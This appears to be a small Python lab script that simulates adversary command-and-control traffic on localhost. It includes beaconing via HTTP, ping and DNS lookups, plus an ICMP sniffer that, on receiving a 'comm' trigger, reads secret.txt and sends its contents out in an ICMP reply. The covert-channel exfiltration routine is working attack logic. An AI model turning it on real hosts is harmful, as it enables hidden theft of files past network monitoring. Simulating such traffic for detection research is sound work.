import socket
import time
import os
import random
import requests
from scapy.all import *
from scapy.layers.inet import ICMP, IP


def connectToAdversary():
    host = 'localhost'
    port = 65000

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))

    server.listen(5)

    conn, addr = server.accept()
    with conn:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(data.decode())
            data = conn.recv(1024)


def sendGetRequest():
    address = 'localhost'
    r = requests.get(url=address)


def sendPostRequest():
    address = 'localhost'
    data = ''
    r = requests.post(url=address, data=data)


def sendICMPPing():
    address = 'localhost'
    response = os.system("ping -c 1 " + address)


def dnsARecord():
    address = 'localhost'
    site = 'example.com'
    os.system('dig @' + address + ' ' + site)


def processPacket(packet):
    if packet[ICMP].type == 8:
        if Raw in packet:
            data = packet[Raw].load.decode()
            if 'comm' in data:
                packet.show()
                # send a file
                with open('secret.txt') as f:
                    string = f.readline()
                time.sleep(3)
                send(IP(dst='localhost', src='localhost') / ICMP(type=0) / string.encode())


def sniffForPacket():
    interface = '\\Device\\NPF_Loopback'
    sniff(iface=interface, prn=processPacket, filter='icmp')


# functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]

functionList = [sendICMPPing()]

while True:
    sniffForPacket()

    waitTime = random.randint(1, 10)
    time.sleep(waitTime)

    random.choice(functionList)
